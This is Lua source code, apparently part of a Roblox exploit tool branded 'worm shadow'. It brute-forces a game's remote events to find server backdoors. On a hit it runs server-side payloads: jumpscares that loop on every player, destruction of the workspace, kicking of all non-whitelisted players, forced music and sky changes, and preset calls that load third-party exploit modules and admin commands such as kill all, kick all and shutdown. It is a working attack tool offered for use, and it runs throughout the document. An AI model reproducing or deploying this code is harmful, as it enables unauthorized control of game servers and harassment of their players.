function splitWaves(remotes) local w={} local s=CFG.WAVE_SIZE for i=1,#remotes,s do local c={} for j=i,math.min(i+s-1,#remotes) do table.insert(c,remotes[j]) end table.insert(w,c) end return w end
function respawnWait() local c=LP.Character if c then local h=c:FindFirstChildOfClass("Humanoid") if h then h.Died:Wait() end end LP.CharacterAdded:Wait() task.wait(1) end
function isBackdoorAlive() if not ST.Backdoor then return false end local ok,p=pcall(function() return ST.Backdoor.Parent end) if not ok then return false end return p~=nil end
function resolvePath(path) local parts={} for seg in path:gmatch("[^%.]+") do table.insert(parts,seg) end if #parts==0 then return nil end local cur=game for i,seg in ipairs(parts) do if i==1 then local ok,svc=pcall(function() return game:GetService(seg) end) if ok and svc then cur=svc else cur=game:FindFirstChild(seg) if not cur then return nil end end else local nx=cur:FindFirstChild(seg) if not nx then return nil end cur=nx end end return cur end

function serializeBackdoor() if not ST.Backdoor or not isBackdoorAlive() then return nil end if not isRealBackdoorPath(ST.Backdoor) then return nil end local ok,data=pcall(function() return S.HttpService:JSONEncode({path=ST.Backdoor:GetFullName(),class=ST.Backdoor.ClassName,foundBy=ST.FoundBy,placeId=game.PlaceId,ts=os.time()}) end) if ok then return data end return nil end
function restoreBackdoor(jsonStr) if not jsonStr then return false end local ok,data=pcall(function() return S.HttpService:JSONDecode(jsonStr) end) if not ok or not data.path then return false end if data.placeId~=game.PlaceId then return false end local obj=resolvePath(data.path) if obj and (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then if not isRealBackdoorPath(obj) then return false end ST.Backdoor=obj ST.FoundBy=data.foundBy or "restored" return true end return false end
function saveState() if not writefile then return end local d=serializeBackdoor() if d then pcall(function() writefile(CFG.STATE_FILE,d) end) end end
function loadState() if not readfile then return false end local ok,data=pcall(function() return readfile(CFG.STATE_FILE) end) if not ok or not data then return false end return restoreBackdoor(data) end
function buildProtectedNames() local pid=game.PlaceId local names={} local seen={} local function add(s) s=tostring(s) if s~="" and not seen[s] then seen[s]=true table.insert(names,s) end end pcall(function() add("lh"..math.floor(pid/6666*1337*pid)) end) pcall(function() add("lh"..tostring(pid*6666+1337)) end) pcall(function() add("lh"..tostring(math.floor(pid^2/1337))) end) pcall(function() add("lh"..tostring(pid*1337)) end) pcall(function() add("lh"..tostring(pid*6666)) end) pcall(function() add("lh"..tostring(math.floor(pid/1337))) end) pcall(function() add("lh"..tostring(pid+6666+1337)) end) pcall(function() add("lh"..tostring(math.floor(pid*1.337))) end) pcall(function() add("lh"..tostring(math.floor(pid/66.66))) end) pcall(function() add("lh"..tostring(bit32.band(pid,0xFFFF))) end) pcall(function() add("lh"..tostring(bit32.bxor(pid,0x1337))) end) pcall(function() add("lh"..tostring(bit32.bxor(pid,0x6666))) end) pcall(function() add("lh"..tostring(bit32.lshift(pid,3))) end) pcall(function() add("lh"..tostring(bit32.rshift(pid,3))) end) pcall(function() add("lh"..tostring(math.floor(pid*31337))) end) pcall(function() add("lh"..tostring(math.floor(pid/31337))) end) pcall(function() add("lh"..tostring(pid.."6666")) end) pcall(function() add("lh"..tostring(pid.."1337")) end) pcall(function() add("lh"..tostring(pid).."lh") end) pcall(function() add("lh_"..tostring(pid)) end) pcall(function() add("route"..tostring(pid)) end) pcall(function() add("protected"..tostring(pid)) end) return names end
function scanProtected() if ST.Locked then return false end local names=buildProtectedNames() log("   route: "..#names.." hashes") for _,name in ipairs(names) do if ST.Locked then return false end local route=S.Replicated:FindFirstChild(name) if route and (route:IsA("RemoteFunction") or route:IsA("RemoteEvent")) then ST.Protected=route ST.ProtectedHits=ST.ProtectedHits+1 log("   route: "..name.." ("..route.ClassName..")") local code=randCode(20) local payload=buildPartPayload(code) task.spawn(function() pcall(function() if route:IsA("RemoteFunction") then local r=route:InvokeServer("ws",payload) if r~=nil then pcall(analyzeResponse,route,r) end else route:FireServer("ws",payload) end end) end) task.wait(0.5) if workspace:FindFirstChild(code) then pcall(function() workspace[code]:Destroy() end) if verifyBackdoor(route) then ST.Backdoor=route ST.FoundBy="protected route ("..name..")" return true end end end task.wait(0.05) end return false end
function scanParallel(remotes) local waves=splitWaves(remotes) for wi,wave in ipairs(waves) do if ST.Locked then return false end log("   parallel wave "..wi.."/"..#waves) local fired={} for _,r in ipairs(wave) do local code=randCode(20) fired[code]=r fireAny(r,buildPartPayload(code)) end local start=tick() while tick()-start<CFG.PART_TIMEOUT do for code,r in pairs(fired) do local p=workspace:FindFirstChild(code) if p then pcall(function() p:Destroy() end) if verifyBackdoor(r) then ST.Backdoor=r ST.FoundBy="parallel part (wave "..wi..")" return true end end end S.RunService.Heartbeat:Wait() end task.wait(0.2) end return false end
function testHead(r) local payload=string.format('local c=game.Players["%s"].Character if c and c:FindFirstChild("Head") then c.Head:Destroy() end',LP.Name) local ok=pcall(function() if r:IsA("RemoteEvent") then r:FireServer(payload) elseif r:IsA("RemoteFunction") then task.spawn(function() pcall(function() r:InvokeServer(payload) end) end) end end) if not ok then return false end local start=tick() while tick()-start<CFG.HEAD_TIMEOUT do S.RunService.Heartbeat:Wait() local c=LP.Character if not c or not c:FindFirstChild("Head") then task.spawn(respawnWait) return true end end return false end
headConfirmed=false
function scanHead(remotes) if CFG.HEAD_REQUIRE_CONFIRM and not headConfirmed then log("   head: SKIPPED") notify("worm shadow","HEAD kills your character. Click HEAD again to confirm.",6) headConfirmed=true return false end headConfirmed=false local wsize=30 local total=#remotes if total==0 then return false end log("   head: "..total.." remotes, "..math.ceil(total/wsize).." waves") for wi=1,total,wsize do if ST.Locked then return false end local wave={} for j=wi,math.min(wi+wsize-1,total) do table.insert(wave,remotes[j]) end local payload=string.format('local c=game.Players["%s"].Character if c and c:FindFirstChild("Head") then c.Head:Destroy() end',LP.Name) for _,r in ipairs(wave) do task.spawn(function() if r:IsA("RemoteEvent") then pcall(function() r:FireServer(payload) end) elseif r:IsA("RemoteFunction") then task.spawn(function() pcall(function() r:InvokeServer(payload) end) end) end end) end local start=tick() local hg=false while tick()-start<CFG.HEAD_TIMEOUT do S.RunService.Heartbeat:Wait() local c=LP.Character if not c or not c:FindFirstChild("Head") then hg=true break end end if hg then task.spawn(respawnWait) task.wait(1.5) for _,r in ipairs(wave) do if ST.Locked then return false end if testHead(r) then if verifyBackdoor(r) then ST.Backdoor=r ST.FoundBy="head destroy" return true end end end end task.wait(0.15) end return false end
KEYWORDS={"execute","exec","run","cmd","command","fire","server","sv","rem","admin","load","eval","code","script","lua","exploit","backdoor","remote","event","func","invoke","send","msg","req","require","loadstring","http","get","post","trigger","call","doit","runscript","execscript","runremote","fireserver"}
function nameMatches(name) name=name:lower() for _,kw in ipairs(KEYWORDS) do if name:find(kw,1,true) then return true end end return false end
function scanNames(remotes) ST.Tagged={} for _,r in ipairs(remotes) do local pn=r.Parent and r.Parent.Name or "" if nameMatches(r.Name) or nameMatches(pn) then table.insert(ST.Tagged,r) end end if #ST.Tagged==0 then return false end local check={} for _,r in ipairs(ST.Tagged) do local code=randCode(20) check[code]=r task.spawn(function() fireAny(r,buildPartPayload(code)) end) task.spawn(function() fireAny(r,code) end) task.spawn(function() if r:IsA("RemoteFunction") then pcall(function() r:InvokeServer(buildPartPayload(code)) end) end end) task.wait(0.05) end task.wait(0.4) local start=tick() while tick()-start<CFG.PART_TIMEOUT do for code,r in pairs(check) do local p=workspace:FindFirstChild(code) if p then pcall(function() p:Destroy() end) if verifyBackdoor(r) then ST.Backdoor=r ST.FoundBy="name keyword" return true end end end S.RunService.Heartbeat:Wait() end return false end
function scanSingleTarget(remotes) if not CFG.USE_SINGLE_TARGET then return false end local target=getActiveRemote(remotes) if not target then return false end ST.SingleTarget=target local code=randCode(20) fireAny(target,buildPartPayload(code)) fireAny(target,code) if target:IsA("RemoteFunction") then task.spawn(function() pcall(function() target:InvokeServer(buildPartPayload(code)) end) end) end task.wait(0.6) if workspace:FindFirstChild(code) then pcall(function() workspace[code]:Destroy() end) if verifyBackdoor(target) then ST.Backdoor=target ST.FoundBy="single target" return true end end return false end
function scanProbe(remotes) ST.Tagged={} for _,r in ipairs(remotes) do local fn=r:GetFullName() local depth=select(2,fn:gsub("%.","")) local pn=r.Parent and r.Parent.Name or "" if depth<=2 or nameMatches(r.Name) or nameMatches(pn) then table.insert(ST.Tagged,r) end end return #ST.Tagged end
BRUTE_PAYLOADS={function(r,c) return function() fireAny(r,buildPartPayload(c)) end end,function(r,c) return function() fireAny(r,"require("..game.PlaceId..")") end end,function(r,c) return function() fireAny(r,c) end end,function(r,c) return function() fireAny(r,{c}) end end,function(r,c) return function() fireAny(r,"loadstring('a=Instance.new(\"Model\",workspace)a.Name=\""..c.."\"')()") end end,function(r,c) return function() fireAny(r,"return function() local a=Instance.new('Model',workspace) a.Name='"..c.."' end") end end,function(r,c) return function() if r:IsA("RemoteFunction") then task.spawn(function() pcall(function() r:InvokeServer(buildPartPayload(c)) end) end) end end end,function(r,c) return function() if r:IsA("RemoteFunction") then task.spawn(function() pcall(function() r:InvokeServer(c) end) end) end end end,function(r,c) return function() if r:IsA("RemoteEvent") then pcall(function() r:FireServer(c,"execute") end) end end end,function(r,c) return function() if r:IsA("RemoteEvent") then pcall(function() r:FireServer(c,game.Players.LocalPlayer) end) end end end,function(r,c) return function() if r:IsA("RemoteEvent") then pcall(function() r:FireServer("exec",c) end) end if r:IsA("RemoteFunction") then task.spawn(function() pcall(function() r:InvokeServer("exec",c) end) end) end end end,function(r,c) return function() if r:IsA("RemoteEvent") then pcall(function() r:FireServer("run",c) end) end end end,function(r,c) return function() if r:IsA("RemoteEvent") then pcall(function() r:FireServer("admin",c) end) end end end,function(r,c) return function() if r:IsA("RemoteEvent") then pcall(function() r:FireServer("load",c) end) end end end,function(r,c) return function() fireAny(r,{code=c}) end end,function(r,c) return function() fireAny(r,{script=c}) end end,function(r,c) return function() fireAny(r,{source=c}) end end,function(r,c) return function() fireAny(r,{exec=true,code=c}) end end,function(r,c) return function() if r:IsA("RemoteEvent") then pcall(function() r:FireServer(c,"") end) end end end,function(r,c) return function() if r:IsA("RemoteEvent") then pcall(function() r:FireServer(c,0) end) end end end,function(r,c) return function() if r:IsA("RemoteEvent") then pcall(function() r:FireServer(c,false) end) end end end,function(r,c) return function() if r:IsA("RemoteEvent") then pcall(function() r:FireServer("",c) end) end end end,function(r,c) return function() pcall(function() if r:IsA("RemoteEvent") then r:FireServer(c) task.wait(0.1) r:FireServer(c,"execute") end end) end end,function(r,c) return function() pcall(function() if r:IsA("RemoteEvent") then r:FireServer("execute",c) task.wait(0.1) r:FireServer(c) end end) end end}
function scanBruteParallel(remotes) local waves=splitWaves(remotes) for wi,wave in ipairs(waves) do if ST.Locked then return false end log("   brute wave "..wi.."/"..#waves) for _,r in ipairs(wave) do if ST.Locked then return false end local code=randCode(20) for _,b in ipairs(BRUTE_PAYLOADS) do task.spawn(b(r,code)) task.wait(0.03+math.random()*0.04) end task.wait(CFG.BRUTE_WAIT_PARALLEL+math.random()*0.1) if workspace:FindFirstChild(code) then pcall(function() workspace[code]:Destroy() end) if verifyBackdoor(r) then ST.Backdoor=r ST.FoundBy="brute (parallel)" return true end end end task.wait(0.2) end return false end
function scanBruteSequential(remotes) for _,r in ipairs(remotes) do if ST.Locked then return false end local code=randCode(20) for _,b in ipairs(BRUTE_PAYLOADS) do task.spawn(b(r,code)) task.wait(CFG.BRUTE_WAIT_SEQUENCE) if workspace:FindFirstChild(code) then pcall(function() workspace[code]:Destroy() end) if verifyBackdoor(r) then ST.Backdoor=r ST.FoundBy="brute (sequential)" return true end end end end return false end
function scanBrute(remotes) if CFG.BRUTE_MODE=="sequence" then return scanBruteSequential(remotes) else return scanBruteParallel(remotes) end end
function autoRetryFromFailures(remotes) if not CFG.AUTO_RETRY then return false end if #ST.FailureLog==0 then return false end local paths={} for _,e in ipairs(ST.FailureLog) do if e.path and e.path~="?" then paths[e.path]=(paths[e.path] or 0)+1 end end local sorted={} for p,c in pairs(paths) do table.insert(sorted,{path=p,count=c}) end table.sort(sorted,function(a,b) return a.count>b.count end) local maxR=math.min(CFG.RETRY_MAX or 12,#sorted) log("   retry: "..maxR) local retried=0 for i=1,maxR do if ST.Locked then return false end local e=sorted[i] local obj=resolvePath(e.path) if obj and (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then retried=retried+1 ST.RetryRuns=ST.RetryRuns+1 if verifyBackdoor(obj) then ST.Backdoor=obj ST.FoundBy="retry ("..retried..")" log("   retry HIT") return true end task.wait(0.1) end end log("   retry done: "..retried) return false end

function runAllMethods(remotes) local hits={} local found=false log(">> method: protected") local ph=nil pcall(function() local sBD=ST.Backdoor ST.Backdoor=nil if scanProtected() then ph=ST.Backdoor end ST.Backdoor=sBD end) if ph then found=true table.insert(hits,{name="protected",path=ph:GetFullName()}) log("   HIT protected") else log("   protected - no hit") end headConfirmed=true local lanes={{name="single",fn=function() return scanSingleTarget(remotes) end},{name="names",fn=function() return scanNames(remotes) end},{name="parallel",fn=function() return scanParallel(remotes) end},{name="head",fn=function() return scanHead(remotes) end},{name="brute",fn=function() return scanBrute(remotes) end}} local lr={} local done=0 local total=#lanes for _,lane in ipairs(lanes) do task.spawn(function() log(">> method: "..lane.name.." (parallel)") local sBD=ST.Backdoor local sBy=ST.FoundBy ST.Backdoor=nil ST.FoundBy="-" local ok,err=pcall(lane.fn) local rBD=ST.Backdoor local rBy=ST.FoundBy ST.Backdoor=sBD ST.FoundBy=sBy if not ok then log("   "..lane.name.." err: "..tostring(err)) lr[lane.name]=nil elseif rBD then lr[lane.name]={bd=rBD,by=rBy} else lr[lane.name]=nil end done=done+1 end) end local ws=tick() while done<total and tick()-ws<300 do task.wait(0.2) end local fBD=nil local fName=nil for _,lane in ipairs(lanes) do local r=lr[lane.name] if r and r.bd then found=true table.insert(hits,{name=lane.name,path=r.bd:GetFullName()}) log("   HIT "..lane.name..": "..r.bd:GetFullName()) if not fBD then fBD=r.bd fName=lane.name end else log("   "..lane.name.." - no hit") end end if not found then log(">> method: retry-from-failures") local sBD=ST.Backdoor ST.Backdoor=nil local okR=pcall(autoRetryFromFailures,remotes) if okR and ST.Backdoor then found=true table.insert(hits,{name="retry",path=ST.Backdoor:GetFullName()}) log("   HIT retry") fBD=ST.Backdoor fName="retry" else ST.Backdoor=sBD log("   retry - no hit") end end if ph then ST.Backdoor=ph ST.FoundBy="protected" elseif fBD then ST.Backdoor=fBD ST.FoundBy=fName end ST.AllHits=hits log("== complete: "..#hits.." hits ==") return found end
HL_KW={"local","function","end","if","then","else","elseif","for","while","do","repeat","until","return","break","in","and","or","not","nil","true","false","self","continue","export","type"}
function escapeHTML(s) return (s:gsub("&","&amp;"):gsub("<","&lt;"):gsub(">","&gt;")) end
function highlight(src) if src=="" then return "" end local out=escapeHTML(src) local slots={} local function stash(h) slots[#slots+1]=h return "\1"..(#slots).."\1" end local function wrap(c,s) return '<font color="'..c..'">'..s..'</font>' end out=out:gsub("(%[%[.-%]%])",function(s) return stash(wrap("#C4FFC1",s)) end) out=out:gsub("(\"[^\n\"]*\")",function(s) return stash(wrap("#C4FFC1",s)) end) out=out:gsub("('[^\n']*')",function(s) return stash(wrap("#C4FFC1",s)) end) out=out:gsub("(%-%-[^\n]*)",function(s) return stash(wrap("#8C8C9B",s)) end) out=out:gsub("(%f[%a_]%d+%.?%d*)",function(s) return stash(wrap("#FF7D7D",s)) end) for _,kw in ipairs(HL_KW) do out=out:gsub("(%f[%a_]"..kw.."%f[%A_])",function(s) return stash(wrap("#D7AEFF",s)) end) end out=out:gsub("\1(%d+)\1",function(n) return slots[tonumber(n)] or "" end) return out end
function broadcastPayload(text) return [[
        for _,p in ipairs(game.Players:GetPlayers()) do
            local pg = p:FindFirstChild("PlayerGui")
            if pg then task.spawn(function()
                if pg:FindFirstChild("WS_BCAST") then pg.WS_BCAST:Destroy() end
                local g = Instance.new("ScreenGui", pg)
                g.Name = "WS_BCAST" g.ResetOnSpawn = false g.DisplayOrder = 999998
                local f = Instance.new("Frame", g)
                f.Size = UDim2.new(1,0,0,90) f.Position = UDim2.new(0,0,0,-120)
                f.BackgroundColor3 = Color3.fromRGB(15,15,20) f.BackgroundTransparency = 0.1
                f.BorderSizePixel = 0
                local s = Instance.new("UIStroke", f)
                s.Color = Color3.fromRGB(212,100,150) s.Thickness = 2
                local t = Instance.new("TextLabel", f)
                t.Size = UDim2.new(1,-40,0,30) t.Position = UDim2.new(0,20,0,15)
                t.BackgroundTransparency = 1
                t.Text = "worm shadow TRANSMISSION"
                t.Font = Enum.Font.GothamBlack t.TextSize = 14
                t.TextColor3 = Color3.fromRGB(46,204,113)
                t.TextXAlignment = Enum.TextXAlignment.Left
                local m = Instance.new("TextLabel", f)
                m.Size = UDim2.new(1,-40,0,35) m.Position = UDim2.new(0,20,0,40)
                m.BackgroundTransparency = 1
                m.Text = "]]..text:gsub('"','\\"'):gsub("\n","\\n")..[["
                m.Font = Enum.Font.GothamBold m.TextSize = 18
                m.TextColor3 = Color3.fromRGB(255,255,255)
                m.TextXAlignment = Enum.TextXAlignment.Left m.TextScaled = true
                local ts = game:GetService("TweenService")
                ts:Create(f, TweenInfo.new(0.5,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Position=UDim2.new(0,0,0.15,0)}):Play()
                task.wait(5)
                local tw = ts:Create(f, TweenInfo.new(0.5,Enum.EasingStyle.Quad,Enum.EasingDirection.In),{Position=UDim2.new(0,0,0,-120)})
                tw:Play() tw.Completed:Connect(function() g:Destroy() end)
            end) end
        end
    ]] end
function jumpscarePayload(target,repeatLoop) local filterCode="" if target~="all" and target~="" then local safe=target:gsub('"','\\"') filterCode=string.format('if p.Name ~= "%s" then goto skipScare end',safe) end local scareFn=[[
        local function scare(p)
            local pg = p:FindFirstChild("PlayerGui")
            if not pg then return end
            task.spawn(function()
                if pg:FindFirstChild("WS_SCREAM") then pcall(function() pg.WS_SCREAM:Destroy() end) end
                local g = Instance.new("ScreenGui", pg)
                g.Name = "WS_SCREAM" g.ResetOnSpawn = false g.DisplayOrder = 999999
                local img = Instance.new("ImageLabel", g)
                img.Size = UDim2.new(1,0,1,0) img.Image = "rbxassetid://130087664524149"
                img.BackgroundTransparency = 1 img.BorderSizePixel = 0
                local snd = Instance.new("Sound", g)
                snd.SoundId = "rbxassetid://6129291390" snd.Volume = 7 snd.Looped = true
                snd:Play()
                task.wait(9)
                pcall(function() snd:Stop() snd:Destroy() g:Destroy() end)
            end)
        end
    ]] local singleFire=[[
        for _,p in ipairs(game.Players:GetPlayers()) do
            ]]..filterCode..[[
            scare(p)
            ::skipScare::
        end
    ]] local repeatFire=[[
        task.spawn(function()
            while true do
                task.wait(20)
                for _,p in ipairs(game.Players:GetPlayers()) do
                    ]]..filterCode..[[
                    scare(p)
                    ::skipScare::
                end
            end
        end)
    ]] return scareFn..singleFire..(repeatLoop and repeatFire or "") end
function skyPayload(id) return [[
        local lg = game:GetService("Lighting")
        pcall(function()
            for _,v in ipairs(lg:GetChildren()) do
                if v:IsA("Sky") or v:IsA("Atmosphere") or v:IsA("Clouds") then v:Destroy() end
            end
        end)
        local sky = Instance.new("Sky", lg)
        sky.Name = "WS_SKY"
        local id = "rbxassetid://]]..tostring(id)..[["
        sky.SkyboxBk = id sky.SkyboxDn = id sky.SkyboxFt = id
        sky.SkyboxLf = id sky.SkyboxRt = id sky.SkyboxUp = id
    ]] end
function hintPayload(text) return [[
        local h = Instance.new("Hint", workspace)
        h.Name = "WS_HINT"
        while true do
            h.Text = "]]..text..[["
            h.Parent = workspace
            wait(15) h.Parent = nil wait(30)
        end
    ]] end
function musicPayload(id) return [[
        local ss = game:GetService("SoundService")
        local c = ss:FindFirstChild("WS_CTRL") or Instance.new("Configuration", ss)
        c.Name = "WS_CTRL"
        c:SetAttribute("Off", false)
        c:SetAttribute("TargetID", "]]..tostring(id)..[[")
        task.spawn(function()
            while c:GetAttribute("Off") == false do
                local snd = ss:FindFirstChild("WS_MUSIC")
                if not snd then
                    snd = Instance.new("Sound", ss)
                    snd.Name = "WS_MUSIC"
                    snd.SoundId = "rbxassetid://" .. c:GetAttribute("TargetID")
                    snd.Volume = 3 snd.Looped = true snd:Play()
                end
                task.wait(0.5)
            end
        end)
    ]] end
function stopMusicPayload() return [[
        local ss = game:GetService("SoundService")
        local c = ss:FindFirstChild("WS_CTRL")
        if c then c:SetAttribute("Off", true) end
        pcall(function()
            for _,v in ipairs(ss:GetDescendants()) do
                if v:IsA("Sound") then v:Stop() v:Destroy() end
            end
            for _,v in ipairs(workspace:GetDescendants()) do
                if v:IsA("Sound") then v:Stop() v:Destroy() end
            end
        end)
    ]] end
function safeLuaKey(name) return string.format("[%q]",name) end
function lockPayload(owner,ownerId,whitelist) local wlStr="" for _,n in ipairs(whitelist or {}) do wlStr=wlStr..safeLuaKey(n).."=true," end return [[
        local owner = ]]..string.format("%q",owner)..[[
        local ownerId = ]]..tostring(ownerId)..[[
        local Panas = {]]..safeLuaKey(owner)..[[=true,]]..wlStr..[[}
        local function esPana(p) return p and (Panas[p.Name] or p.UserId == ownerId) end
        pcall(function()
            for _,o in ipairs(workspace:GetChildren()) do
                if not o:IsA("Terrain") and not o:IsA("Camera") then o:Destroy() end
            end
        end)
        local b = Instance.new("Part", workspace)
        b.Name = "WS_BASE" b.Size = Vector3.new(500,4,500)
        b.Position = Vector3.new(0,-2,0) b.Anchored = true
        b.Material = Enum.Material.Grass b.Color = Color3.fromRGB(58,125,45)
        local sp = Instance.new("SpawnLocation", workspace)
        sp.Name = "WS_SPAWN" sp.Position = Vector3.new(0,2,0)
        sp.Size = Vector3.new(6,1,6) sp.Anchored = true
        for _,p in ipairs(game.Players:GetPlayers()) do pcall(function() p:LoadCharacter() end) end
        task.spawn(function()
            while true do
                task.wait(2)
                for _,p in ipairs(game.Players:GetPlayers()) do
                    if not esPana(p) then
                        pcall(function() p:Kick("Server restricted by worm shadow") end)
                    end
                end
            end
        end)
        task.spawn(function()
            while true do
                local h = Instance.new("Hint", workspace)
                h.Text = "You cannot execute anything. Join worm shadow"
                task.wait(0.5)
                h:Destroy()
            end
        end)
    ]] end

PRESETS={{name="Anon Destruction",code=[[
local sky="rbxassetid://122045975874287"
local snd="rbxassetid://1840712882"
local l=game:GetService("Lighting")
l:ClearAllChildren()
local s=Instance.new("Sky",l)
s.SkyboxBk=sky s.SkyboxDn=sky s.SkyboxFt=sky
s.SkyboxLf=sky s.SkyboxRt=sky s.SkyboxUp=sky
local m=Instance.new("Sound",l)
m.SoundId=snd m.Volume=3 m.Looped=true
Instance.new("DistortionSoundEffect",m).Level=0.9
m:Play()
for _,v in ipairs(workspace:GetDescendants()) do
if v:IsA("BasePart") then
for _,face in ipairs({Enum.NormalId.Top,Enum.NormalId.Bottom,Enum.NormalId.Front,Enum.NormalId.Back,Enum.NormalId.Left,Enum.NormalId.Right}) do
local d=Instance.new("Decal",v)
d.Texture=sky d.Face=face
end
v.Locked=false v.Anchored=false
end
end
]]},{name="Jim Carrey",code=[[
local SKY="rbxassetid://71917681937047"
local FACE="rbxassetid://17092665011"
local SND="rbxassetid://130343283437741"
local l=game:GetService("Lighting") l:ClearAllChildren()
local s=Instance.new("Sky",l)
s.SkyboxBk=SKY s.SkyboxDn=SKY s.SkyboxFt=SKY
s.SkyboxLf=SKY s.SkyboxRt=SKY s.SkyboxUp=SKY
local m=Instance.new("Sound",workspace)
m.SoundId=SND m.Volume=10 m.PlaybackSpeed=0.1 m.Looped=true m:Play()
for _,p in ipairs(game.Players:GetPlayers()) do
if p.Character and p.Character:FindFirstChild("Head") then
local h=p.Character.Head
if h:FindFirstChild("WSFace") then h.WSFace:Destroy() end
local bb=Instance.new("BillboardGui",h)
bb.Name="WSFace" bb.Size=UDim2.new(4,0,4,0)
bb.AlwaysOnTop=true bb.Adornee=h
local i=Instance.new("ImageLabel",bb)
i.Size=UDim2.new(1,0,1,0) i.BackgroundTransparency=1 i.Image=FACE
end
end
]]},{name="Scary Mario",code=[[
local snd=Instance.new("Sound",workspace)
snd.SoundId="rbxassetid://133180219581309"
snd.Volume=10 snd.Looped=true snd.PlaybackSpeed=0.09
snd:Play()
local dec="rbxassetid://86166390223728"
for _,v in ipairs(workspace:GetDescendants()) do
if v:IsA("BasePart") then
for _,f in ipairs({Enum.NormalId.Top,Enum.NormalId.Bottom,Enum.NormalId.Left,Enum.NormalId.Right,Enum.NormalId.Front,Enum.NormalId.Back}) do
local d=Instance.new("Decal",v) d.Texture=dec d.Face=f
end
end
end
]]},{name="Obama Jumpscare",code='for _,v in pairs(game.Players:GetPlayers()) do require(94540928447702).s(v.Name) end'},{name="Grab Knife",code='require(93444499562289).DE("%%username%%")'},{name="Helicopter",code='require(12620186035).Huey("%%username%%")'},{name="John Doe",code='require(2845929020).ooga("%%username%%")'},{name="AirStrike",code='require(11670894308).Strafe("%%username%%")'},{name="Doge Army",code='require(16662812199).fehack("%%username%%")'},{name="Goner",code='require(4513235536).G("%%username%%")'},{name="MLG Gun",code='require(6802356973).load("%%username%%")'},{name="Uzi Gun",code='require(16662808456):Fire("%%username%%", "dev-uzi")'},{name="Lua Hammer",code='require(11957419646):Fire("%%username%%", "lua")'},{name="Guns Pack",code='require(16668739839).load("%%username%%")'}}
HUB_PRESETS={{name="DominantUltimate",code='require(121425622240385).dominantultimate("'..LP.Name..'")'},{name="Sorcerer",code='require(14499140823)("'..LP.Name..'", "sorcerer")'},{name="Ro-xploit v7",code='require(103033872950598)("'..LP.Name..'")'},{name="Sugma",code='require(11183244198):s("sugma", game.Players.'..LP.Name..')'},{name="Gradient Admin",code='require(82303184140990)("'..LP.Name..'", ColorSequence.new(Color3.fromRGB(71,148,253), Color3.fromRGB(71,253,160)), "Standard")'}}
HD_SHORTCUTS={{name="Kill All",cmd=";kill all"},{name="Kick All",cmd=";kick all"},{name="Noclip",cmd=";noclip"},{name="Unnoclip",cmd=";unnoclip"},{name="Fly",cmd=";fly"},{name="Unfly",cmd=";unfly"},{name="Speed All 50",cmd=";speed all 50"},{name="Spin All 50",cmd=";spin all 50"},{name="Disco",cmd=";disco"},{name="Shutdown",cmd=";shutdown"},{name="Fog Black",cmd=";fogcolor black"},{name="Night",cmd=";time 0"},{name="Chat All",cmd=";chat all worm shadow was here"},{name="Server Msg",cmd=";sm worm shadow was here"},{name="Btools",cmd=";btools me"},{name="Hide GUIs",cmd=";hideguis others"},{name="Unmusic",cmd=";unmusic"}}
function runHD(cmd) local rs=S.Replicated local hd=rs:FindFirstChild("HDAdminHDClient") or rs:FindFirstChild("HDAdminClient") if not hd then return false end local sig=hd:FindFirstChild("Signals") if not sig then return false end local silent=sig:FindFirstChild("RequestCommandSilent") local modify=sig:FindFirstChild("RequestCommandModification") local ok=false if silent then if silent:IsA("RemoteEvent") then ok=pcall(function() silent:FireServer(cmd) end) or ok elseif silent:IsA("RemoteFunction") then ok=pcall(function() silent:InvokeServer(cmd) end) or ok end end if modify then if modify:IsA("RemoteEvent") then ok=pcall(function() modify:FireServer(cmd) end) or ok elseif modify:IsA("RemoteFunction") then ok=pcall(function() modify:InvokeServer(cmd) end) or ok end end return ok end
function wsDumpTokenIntel() local lines={"== TOKEN POOL =="} local list={} for t,c in pairs(ST.TokenPool) do table.insert(list,{tok=t,cnt=c}) end table.sort(list,function(a,b) return a.cnt>b.cnt end) for i=1,math.min(20,#list) do table.insert(lines,string.format("#%d [%d] %s",i,list[i].cnt,list[i].tok)) end table.insert(lines,"== CRACKED ==") for tok,info in pairs(ST.TokenCracked) do table.insert(lines,string.format("  %s -> %d (hits %d)",tok:sub(1,16),info.pos,info.hits)) end table.insert(lines,"== ARG GATES ==") for r,g in pairs(ST.ArgDiff) do local ok,name=pcall(function() return r.Name end) if ok then table.insert(lines,string.format("  %s -> %d (%.0f%%)",name,g.gateIndex,g.confidence*100)) end end table.insert(lines,"== STATS ==") table.insert(lines,string.format("crack att: %d, hits: %d",ST.CrackAttempts,ST.CrackHits)) return table.concat(lines,"\n") end
function wsExportTokenIntel() if not writefile then return false end local ok=pcall(function() writefile("ws_tokens.json",S.HttpService:JSONEncode({tokens=ST.TokenPool,cracked=(function() local out={} for t,i in pairs(ST.TokenCracked) do out[t]={pos=i.pos,hits=i.hits} end return out end)(),placeId=game.PlaceId,ts=os.time()})) end) return ok end
function wsImportTokenIntel() if not readfile then return false end local ok=pcall(function() local raw=readfile("ws_tokens.json") if not raw then return end local data=S.HttpService:JSONDecode(raw) if not data then return end if data.tokens then for k,v in pairs(data.tokens) do ST.TokenPool[k]=(ST.TokenPool[k] or 0)+v end end if data.cracked then for t,i in pairs(data.cracked) do ST.TokenCracked[t]={pos=i.pos,hits=i.hits,remote=nil} end end end) return ok end
WS_HAS_BYTECODE=type(getscriptbytecode)=="function"
WS_HAS_DECOMPILE=type(decompile)=="function"
